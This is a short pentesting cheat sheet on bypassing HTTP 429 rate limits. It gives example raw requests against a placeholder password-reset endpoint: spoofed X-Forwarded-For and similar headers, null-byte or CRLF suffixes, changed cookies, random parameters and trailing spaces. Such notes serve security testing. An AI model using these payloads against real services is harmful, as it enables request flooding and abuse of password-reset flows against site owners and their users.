---
title: "Bypass 429 (Too Many Requests)"
author: ["4shen0ne"]
draft: false
---

## Try add some custom header {#try-add-some-custom-header}

```nil
X-Forwarded-For : 127.0.0.1
X-Forwarded-Host : 127.0.0.1
X-Client-IP : 127.0.0.1
X-Remote-IP : 127.0.0.1
X-Remote-Addr : 127.0.0.1
X-Host : 127.0.0.1
```

For example:

```nil
POST /ForgotPass.php HTTP/1.1
Host: target.com
X-Forwarded-For : 127.0.0.1
...

email=victim@gmail.com
```


## Adding Null Byte ( %00 ) or CRLF ( %09, %0d, %0a ) at the end of {#adding-null-byte--00--or-crlf--09-0d-0a--at-the-end-of}

the Email can bypass rate limit.

```nil
POST /ForgotPass.php HTTP/1.1
Host: target.com
...

email=victim@gmail.com%00
```


## Try changing user-agents, cookies and IP address {#try-changing-user-agents-cookies-and-ip-address}

```nil
POST /ForgotPass.php HTTP/1.1
Host: target.com
Cookie: xxxxxxxxxx
...

email=victim@gmail.com
```

Try this to bypass

```nil
POST /ForgotPass.php HTTP/1.1
Host: target.com
Cookie: aaaaaaaaaaaaa
...

email=victim@gmail.com
```


## Add a random parameter on the last endpoint {#add-a-random-parameter-on-the-last-endpoint}

```nil
POST /ForgotPass.php HTTP/1.1
Host: target.com
...

email=victim@gmail.com
```

Try this to bypass

```nil
POST /ForgotPass.php?random HTTP/1.1
Host: target.com
...

email=victim@gmail.com
```


## Add space after the parameter value {#add-space-after-the-parameter-value}

```nil
POST /api/forgotpass HTTP/1.1
Host: target.com
...

{"email":"victim@gmail.com"}
```

Try this to bypass

```nil
POST /api/forgotpass HTTP/1.1
Host: target.com
...

{"email":"victim@gmail.com "}
```


## References {#references}

-   [Huzaifa
    Tahir](https://huzaifa-tahir.medium.com/methods-to-bypass-rate-limit-5185e6c67ecd)
-   [Gupta
    Bless](https://gupta-bless.medium.com/rate-limiting-and-its-bypassing-5146743b16be)
